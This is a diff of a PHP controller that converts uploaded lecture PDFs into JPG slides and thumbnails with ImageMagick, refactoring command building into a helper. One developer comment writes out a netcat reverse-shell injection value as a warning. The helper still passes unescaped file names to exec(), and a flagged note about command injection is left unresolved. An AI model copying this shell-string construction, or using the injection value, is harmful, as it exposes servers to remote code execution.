@@ -10,6 +10,11 @@ define('SLIDE_THUMBNAIL_IMAGE_HEIGHT', 130);
 
 define('RANDOM_STRING_LENGTH', 30);
 
+define('MAX_SLIDE_UPLOAD_SIZE', 25000);   // 25MB
+
+define('SLIDE_IMAGE_QUALITY', 85);
+define('THUMBNAIL_IMAGE_QUALITY', 95);
+
 function generate_random_string()
 {
     return substr(md5(uniqid(rand(), true)), 0, RANDOM_STRING_LENGTH);
@@ -93,14 +98,6 @@ class Lecture extends MY_Controller {
         if (is_null($lecture)) {
             show_404();
         }
-
-        // NOTE(kayvonf): At present we don't have any database
-        // information about the number of slides in a lecture.  So as a hack
-        // for now we'll just find the slides on the fly by scanning through the
-        // appropriate directory.
-
-        // TODO(kayvonf) Use $lecture->num_slides from database rather than slurping
-        // all valid files from the directory.
 
         $slides_array = array();
         $lecture_image_basedir =
@@ -216,7 +213,7 @@ class Lecture extends MY_Controller {
         $config['upload_path'] = realpath($this->config->item('content_base_path') . '/' .
                       $this->config->item('uploads_rel_path'));
         $config['allowed_types'] = 'pdf';
-        $config['max_size']= '25000'; // 25MB
+        $config['max_size']= MAX_SLIDE_UPLOAD_SIZE;
         $config['remove_spaces'] = TRUE;
         $config['file_name'] = 'slides_' . md5(microtime()) . '.pdf';
 
@@ -250,11 +247,15 @@ class Lecture extends MY_Controller {
 
         // 2. verify there are the same number of slides as before.
 
-        // Convert the uploaded pdf file into a bunch of png files for slides.
-        $output_filename = $tmp_image_dir . '/' . SLIDE_NAME_FORMAT_STRING . '.png';
-        // XXX(awreece) Check for command injection!
-        $cmd = IMAGEMAGICK_EXEC . ' ' . $uploaded['full_path'] .
-            ' -resize x' . SLIDE_IMAGE_HEIGHT . ' ' . $output_filename;
+        // Convert the uploaded pdf file into a bunch of image files for slides.
+        $output_filename = $tmp_image_dir . '/' . SLIDE_NAME_FORMAT_STRING . '.jpg';
+
+	// NOTE(kayvonf): 12/28/15 multiplication by two on the slide
+	// height is so that the image is big enough for modern retina
+	// displays. (the slides were starting to look a little
+	// fuzzy.)
+
+	$cmd = $this->get_image_resize_cmd_string($uploaded['full_path'], $output_filename, 2 * SLIDE_IMAGE_HEIGHT, SLIDE_IMAGE_QUALITY);
         log_message('debug', 'Executing: ' . $cmd);
         $cmd_result = array();
         exec($cmd, $cmd_result);
@@ -275,32 +276,31 @@ class Lecture extends MY_Controller {
         log_message('debug', 'Files in ' . $tmp_image_dir . ': ' . $slide_count . ', expecting ' . $lecture->num_slides);
 	
 	if ($slide_count != $lecture->num_slides) {
-           log_message('debug', 'Incorrect number of slides');
+           log_message('debug', 'Failured to update lecture. Incorrect number of slides in uploaded pdf.');
 
 	   // cleanup:
            exec('rm -R ' . $tmp_dir);	
 
            $data['lecture'] = $lecture;		
-	   $data['error'] = 'Uploaded pdf has different number of slides as existing lecture.';	
+	   $data['error'] = 'Uploaded pdf must have the same number of slides as the existing lecture.';	
            $this->load_view('Lecture Edit', 'lecture_edit', $data);
 	   return;
         }
 
-	// make some thumbnails, and copy the input image into it's final position
+	// make some thumbnails, and copy the input image into its final position
         foreach($slide_images as $slide_image_filename) {
 
  	    $path_parts = pathinfo($slide_image_filename);
 
-            if ($path_parts['extension'] != 'png')
+            if ($path_parts['extension'] != 'jpg')
                continue;
 
                 $input_image = $tmp_image_dir . '/' . $path_parts['basename'];
                 $thumb_image = $lecture_thumb_dir . '/' . $path_parts['basename'];
                 log_message('debug', 'Executing: ' . $cmd);
 
-        	// TODO(awreece) Unify command string construction code.
-                $cmd = IMAGEMAGICK_EXEC . ' ' . $input_image .
-            ' -resize x' . SLIDE_THUMBNAIL_IMAGE_HEIGHT . ' ' . $thumb_image;
+		// NOTE(kayvonf): multiplication by 2 for retina display
+                $cmd = $this->get_image_resize_cmd_string($input_image, $thumb_image, 2 * SLIDE_THUMBNAIL_IMAGE_HEIGHT, THUMBNAIL_IMAGE_QUALITY);
                 exec($cmd);
 
 		rename($input_image, $lecture_image_dir . '/' . $path_parts['basename']);
@@ -342,7 +342,7 @@ class Lecture extends MY_Controller {
         $config['upload_path'] = realpath($this->config->item('content_base_path') . '/' .
                       $this->config->item('uploads_rel_path'));
         $config['allowed_types'] = 'pdf';
-        $config['max_size']= '25000'; // 25MB
+        $config['max_size']=  MAX_SLIDE_UPLOAD_SIZE;
         $config['remove_spaces'] = TRUE;
         $config['file_name'] = 'slides_' . md5(microtime()) . '.pdf';
 
@@ -393,7 +393,8 @@ class Lecture extends MY_Controller {
 
             // XXX(awreece): should really scrub the shortname, a shortname of
             // "; nc ip 6666 | bash | nc ip 6667#" should be a connect back shell.
-            // NOTE(kayvonf): Isn't shortname scrubbed appropriately by the form validator?
+            // NOTE(kayvonf): Isn't shortname scrubbed appropriately
+            // by the form validator, which doesn't allow spaces?
             $lecture_dir = $this->get_lecture_base_path($lecture_number, $lecture_shortname);
             $lecture_image_dir = $lecture_dir . '/' . LECTURE_IMAGES_DIR;
             $lecture_thumb_dir = $lecture_dir . '/' . LECTURE_THUMBS_DIR;
@@ -410,10 +411,13 @@ class Lecture extends MY_Controller {
             mkdir($lecture_thumb_dir);
 
             // Convert the uploaded pdf file into a bunch of png files for slides.
-            $output_filename = $lecture_image_dir . '/' . SLIDE_NAME_FORMAT_STRING . '.png';
-        // XXX(awreece) Check for command injection!
-            $cmd = IMAGEMAGICK_EXEC . ' ' . $uploaded['full_path'] .
-            ' -resize x' . SLIDE_IMAGE_HEIGHT . ' ' . $output_filename;
+            $output_filename = $lecture_image_dir . '/' . SLIDE_NAME_FORMAT_STRING . '.jpg';
+
+    	    // NOTE(kayvonf): 12/28/15 multiplication by two on the slide
+            // height is so that the image is big enough for modern retina
+	    // displays. (the slides were starting to look a little
+	    // fuzzy.)
+	    $cmd = $this->get_image_resize_cmd_string($uploaded['full_path'], $output_filename, 2 * SLIDE_IMAGE_HEIGHT, SLIDE_IMAGE_QUALITY);
             log_message('debug', 'Executing: ' . $cmd);
             $cmd_result = array();
             exec($cmd, $cmd_result);
@@ -430,14 +434,12 @@ class Lecture extends MY_Controller {
             $slide_images = scandir($lecture_image_dir);
             $slides = array();
 
-            log_message('debug', 'Files in ' . $lecture_image_dir . ': ' . count($slide_images));
-
             // TODO(awreece) Do this as batch?
             foreach($slide_images as $slide_image_filename) {
 
                 $path_parts = pathinfo($slide_image_filename);
 
-                if ($path_parts['extension'] != 'png')
+                if ($path_parts['extension'] != 'jpg')
                     continue;
 
                 $slide_count++;
@@ -446,9 +448,8 @@ class Lecture extends MY_Controller {
                 $thumb_image = $lecture_thumb_dir . '/' . $path_parts['basename'];
                 log_message('debug', 'Executing: ' . $cmd);
 
-        	// TODO(awreece) Unify command string construction code.
-                $cmd = IMAGEMAGICK_EXEC . ' ' . $input_image .
-            ' -resize x' . SLIDE_THUMBNAIL_IMAGE_HEIGHT . ' ' . $thumb_image;
+		// NOTE(kayvonf): multiplication by 2 for retina display
+                $cmd = $this->get_image_resize_cmd_string($input_image, $thumb_image, 2 * SLIDE_THUMBNAIL_IMAGE_HEIGHT, THUMBNAIL_IMAGE_QUALITY);
                 exec($cmd);
             }
 
@@ -473,7 +474,7 @@ class Lecture extends MY_Controller {
             // TODO(awreece) What if this fails?
             $this->slides_model->add_slides_for_lecture($lecture, $slide_count);
 
-            // Done: display a success message.
+            // Done: display a success message
             $this->load_view('Upload Success', 'lecture_create_success', $data);
         }
     }
@@ -528,7 +529,18 @@ class Lecture extends MY_Controller {
     // Will return an image path that can be appended to either a base
     // filesystem path or a base URL.
     function get_lecture_image_rel_path($slide_name, $image_type) {
-        return $image_type . '/' . $slide_name . ".png";
+        return $image_type . '/' . $slide_name . ".jpg";
+    }
+
+    function get_image_resize_cmd_string($input_filename, $output_filename, $image_height, $image_quality) {
+
+        // NOTE(kayvonf): the 'scene 1' argument starts counting at 1
+	// instead of 0 (its ignored if the output filename is not a pattern)
+
+        // XXX(awreece) Check for command injection!
+        $cmd = IMAGEMAGICK_EXEC . ' ' . $input_filename .
+            ' -resize x' . $image_height . ' -quality ' . $image_quality . ' -scene 1 ' . $output_filename;
+	return $cmd;
     }
 
     function get_lecture_pdf_rel_path($number, $shortname) {
